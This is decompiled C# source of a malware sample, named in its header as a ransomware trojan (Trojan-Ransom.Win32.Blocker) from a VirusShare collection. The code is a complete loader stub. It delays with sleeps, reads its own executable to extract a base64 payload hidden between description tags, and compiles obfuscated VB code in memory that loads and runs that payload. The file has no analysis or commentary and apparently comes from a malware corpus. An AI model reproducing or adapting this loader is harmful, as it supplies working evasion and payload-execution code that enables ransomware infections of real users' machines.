// Decompiled with JetBrains decompiler
// Type: 虂䄢�葏퀵噯逐缤
// Assembly: speedcore, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2250F83-F2E9-42DD-AB25-9E4C8EAC4C75
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.ahop-86c277d8dc9db1a266d0e1bd6532998d29193d566d7c2d43da7619c0a90f412a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

[StandardModule]
internal sealed class 虂䄢\uFFFD葏퀵噯逐缤
{
  public static object aawfhash()
  {
    CompilerParameters options = new CompilerParameters();
    ArrayList arrayList1 = new ArrayList();
    ArrayList arrayList2 = new ArrayList();
    Thread.Sleep(1);
    CodeDomProvider provider = CodeDomProvider.CreateProvider("òB".Replace("ò", "V"));
    arrayList2.Add((object) 10);
    options.GenerateInMemory = true;
    options.CompilerOptions = "/optimize+ /platform:x86 /target:library";
    arrayList2.Add((object) 10);
    options.ReferencedAssemblies.AddRange(new string[6]
    {
      "System.dll",
      "System.Data.dll",
      "System.Deployment.dll",
      "System.Drawing.dll",
      "System.Windows.Forms.dll",
      "System.Xml.dll"
    });
    arrayList2.Add((object) 10);
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.Append("\r\nImports System, Microsoft.VisualBasic, System.Reflection");
    stringBuilder.Append("\r\nModule Yo");
    stringBuilder.Append("\r\nSub Main()");
    arrayList2.Add((object) 10);
    stringBuilder.Append("\r\nEnd Sub");
    stringBuilder.Append("\r\nPublic function hard(byval s as Object) As Byte");
    stringBuilder.Append("\r\nreturn Assembly.Load(convert.frombase64string(s)).Entrypoint.Invoke(nothing,nothing)");
    stringBuilder.Append("\r\nend function");
    stringBuilder.Append("\r\nEnd module");
    CompilerResults compilerResults = provider.CompileAssemblyFromSource(options, stringBuilder.ToString());
    arrayList2.Add((object) 10);
    Type type = compilerResults.CompiledAssembly.GetType("°°o".Replace("°°", "Y"));
    arrayList2.Add((object) 10);
    return (object) type.GetMethod("#rd".Replace("#", "ha"));
  }

  [STAThread]
  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void Main()
  {
    ArrayList arrayList = new ArrayList();
    Thread.Sleep(2000);
    Thread.Sleep(2000);
    string str1 = "";
    arrayList.Add((object) 40);
    string str2 = "<descri-".Replace("-", "ption>");
    string str3 = "</descr-".Replace("-", "iption>");
    arrayList.Add((object) 40);
    FileSystem.FileOpen(1, Process.GetCurrentProcess().MainModule.FileName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
    arrayList.Add((object) 40);
    string str4 = Strings.Space(checked ((int) FileSystem.LOF(1)));
    FileSystem.FileGet(1, ref str4);
    arrayList.Add((object) 40);
    FileSystem.FileClose(1);
    string str5 = str4;
    arrayList.Add((object) 40);
    int startIndex = checked (str5.IndexOf(str2) + str2.Length);
    arrayList.Add((object) 40);
    for (; startIndex != checked (str2.Length - 1); startIndex = checked (str5.IndexOf(str2, startIndex) + str2.Length))
    {
      str1 = str5.Substring(startIndex, checked (str5.IndexOf(str3, startIndex) - startIndex));
      arrayList.Add((object) 40);
    }
    object obj = (object) new string[1]{ str1 };
    arrayList.Add((object) 40);
    object Instance = 虂䄢\uFFFD葏퀵噯逐缤.aawfhash();
    object[] objArray = new object[2]
    {
      RuntimeHelpers.GetObjectValue(虂䄢\uFFFD葏퀵噯逐缤.aawfhash()),
      RuntimeHelpers.GetObjectValue(obj)
    };
    object[] Arguments = objArray;
    bool[] flagArray = new bool[2]{ false, true };
    bool[] CopyBack = flagArray;
    NewLateBinding.LateCall(Instance, (Type) null, "Invoke", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
    if (!flagArray[1])
      return;
    RuntimeHelpers.GetObjectValue(objArray[1]);
  }
}
